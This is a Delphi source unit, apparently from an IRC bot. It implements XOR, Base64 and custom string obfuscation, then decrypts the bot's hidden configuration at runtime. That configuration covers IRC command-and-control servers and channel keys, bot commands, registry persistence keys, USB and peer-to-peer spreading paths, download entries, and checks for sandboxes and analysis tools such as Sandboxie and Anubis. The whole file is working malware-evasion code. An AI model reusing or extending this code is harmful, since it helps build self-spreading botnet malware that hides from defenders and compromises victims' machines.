unit polyengine;

interface

uses strings, Windows;

var
  CKey:  Integer = 0;
  XKey:  Integer = 0;
  intdefkey:  Integer = 0;
  cryptcount: Integer = 0;
  RCKey: String = '';
  Caesar: Boolean = FAlSE;
  X: Boolean = FAlSE;
  RC4: Boolean = FAlSE;
  Base64: Boolean = FAlSE;
  simplecrypt: Boolean = FAlSE;

  Codes64: String = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';

procedure DECRYPT;
function DecryptString(CipherText: String; pass :integer):String;

implementation

function XorCrypt(strText: string;intKey: longint): string;
var
  i: integer;
  strResult: string;
begin
  strResult := strText;
  // sync RandSeed key to generate Random chars
  RandSeed := intKey;
  // cipher
  for i := 1 to Length(strText) do
    strResult[i] := Chr(Ord(strResult[i]) xor Random(255));
  // set results
  Result := strResult;
end;

function XorDecrypt(strText: string;intKey: longint): string;
begin
  // deciphers the string
  Result := XorCrypt(strText, intKey);
end;

function RandomString(PLen: Integer): string;
var
  str: string;
begin
  Randomize;
  str    := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = PLen)
end;


function EasyDecrypt(const InStr: String): String;
var
  C1, C2: Integer;
  Ch1, Ch2: Byte;
  OutStr, Key: String;
begin
  Key := '####';
  C1 := 0;
  C2 := 0;
  OutStr := '';
  while (C1 < Length(InStr)) do
  begin
    Inc(C1);
    Inc(C2);
    if (C2 > Length(Key)) then C2 := 1;
    Ch1 := Ord(InStr[C1]);
    Ch2 := Ord(Key[C2]) + 128;
    OutStr := OutStr + Chr(Ch1 xor Ch2);
  end;
  Result := OutStr;
end;


function Encode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Ord(s[i]);
    b := b * 256 + x;
    a := a + 8;
    while a >= 6 do
    begin
      a := a - 6;
      x := b div (1 shl a);
      b := b mod (1 shl a);
      Result := Result + Codes64[x + 1];
    end;
  end;
  if a > 0 then
  begin
    x := b shl (6 - a);
    Result := Result + Codes64[x + 1];
  end;
end;

function Decode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Pos(s[i], codes64) - 1;
    if x >= 0 then
    begin
      b := b * 64 + x;
      a := a + 6;
      if a >= 8 then
      begin
        a := a - 8;
        x := b shr a;
        b := b mod (1 shl a);
        x := x mod 256;
        Result := Result + chr(x);
      end;
    end
    else
      Exit;
  end;
end;





function DecryptString(CipherText: String; pass :integer):String;
var WorkBuffer: String;
begin
  WorkBuffer := CipherText;
  WorkBuffer := EasyDeCrypt(WorkBuffer);
  WorkBuffer := Decode64(Workbuffer);
  WorkBuffer := XorDecrypt(WorkBuffer, pass);
  Result := WOrkbuffer;
end;

function CryptString(PlainText: String; pass :Integer):String;
var
  WorkBuffer: String;
begin
  WorkBuffer := PlainText;
  ////////////////////////////////////////////
  WorkBuffer := polyengine.XorCrypt(Workbuffer, pass);
  WorkBuffer := Encode64(Workbuffer);
  WorkBuffer := EasydeCrypt(WorkBuffer);
  ////////////////////////////////////////////
  Result := Workbuffer;
  ////////////////////////////////////////////
end;

procedure DECRYPT;
var i : Integer;
    buf : String;
begin
  strings.bot_mutexname := DecryptString(strings.bot_mutexname, strings.key);
  for i:= 1 to 11 do begin
    strings.BotComnd[i] := DecryptString(strings.BotComnd[i], strings.key);
  end;
  for i:= 1 to 2 do begin
    strings.Authinfo[i] := DecryptString(strings.Authinfo[i], strings.key);
  end;
  strings.bot_installname := DecryptString(strings.bot_installname, strings.key);
  strings.prefix          := DecryptString(strings.prefix, strings.key);
  for i := 1 to 2 do begin
    buf := DecryptString(strings.ircserver[i], strings.key);
    strings.ircserver[i] := buf;
  end;
  strings.serverport      := DecryptString(strings.serverport, strings.key);
  strings.chan            := DecryptString(strings.chan, strings.key);
  strings.server_channelkey := DecryptString(strings.server_channelkey, strings.key);
  strings.regedit_path    := DecryptString(strings.regedit_path, strings.key);
  strings.regedit_key     := DecryptString(strings.regedit_key, strings.key);
  strings.Floppy          := DecryptString(strings.Floppy, strings.key);
  strings.USBmsg1         := DecryptString(strings.USBmsg1, strings.key);
  strings.USBmsg2         := DecryptString(strings.USBmsg2, strings.key);
  for i := 1 to 17 do begin
    strings.USBSettings[i] := DecryptString(Strings.USBSettings[i], strings.key);
  end;
  strings.Dl1 := DecryptString(strings.dl1, strings.key);
  strings.Dl2 := DecryptString(strings.dl2, strings.key);
  strings.Dl3 := DecryptString(strings.dl3, strings.key);
  strings.Dl4 := DecryptString(strings.dl4, strings.key);

  strings.LoginPut := DecryptString(strings.LoginPut, strings.key);
  strings.LogoutPut := DecryptString(strings.LogoutPut, strings.key);
  strings.uTOrrentname := DecryptString(strings.uTOrrentname, strings.key);
  strings.AzureusName  := DecryptString(strings.AzureusName, strings.key);
  strings.uTorrent     := DecryptString(strings.uTorrent, strings.key);
  strings.azpath := DecryptString(strings.azpath, strings.key);
  strings.azchar1      := DecryptString(azchar1, key);
  strings.azchar2      := DecryptString(azchar2, key);
  strings.azchar3      := DecryptString(azchar3, key);
  strings.azchar4      := DecryptString(azchar4, key);
  open := DecryptString(open, key);
  utchar1 := DecryptString(utchar1, key);
  utpath := DecryptString(utpath, key);

  usr32 := DecryptString(usr32, key);
  shFolder := DecryptString(shfolder, key);
  InternalGetWindowText := DecryptString(internalgetwindowtext, key);
  shgetfolderpatha      := DecryptString(shgetfolderpatha, key);
  SharedAccess          := DecryptString(sharedaccess, key);

  for i:= 1 to 26 do begin
    P2PPaths[i] := DecryptString(P2PPaths[i], key);
  end;
  for i := 1 to 9 do begin
    p2pnames[i] := DecryptString(p2pnames[i], key);
  end;

  ICQPath := Decryptstring(icqpath, key);
  aimpath := Decryptstring(aimpath, key);

  sbiedll := Decryptstring(sbiedll, key);
  dbghelp := DecryptString(dbghelp, key);
  Curver := DecryptString(curver, key);
  pid := DecryptString(pid,key);
  jbox := DecryptString(jbox, key);
  cwsbox := DecryptString(cwsbox, key);
  anubis := DecryptString(anubis, key);

  batname := DecryptString(batname, key);
  tryname := DecryptString(tryname, key);
  delname := DecryptString(delname, key);
  sign := DecryptString(sign, key);
  del1 := DecryptString(del1, key);
  del2 := DecryptString(del2, key);

  for i := 1 to 11 do begin
    IRCPROT[i] := DecryptString(IRCPROT[i], key);
  end;
  Decrypted := TRUE;
  sleep(5000);
end;
end.
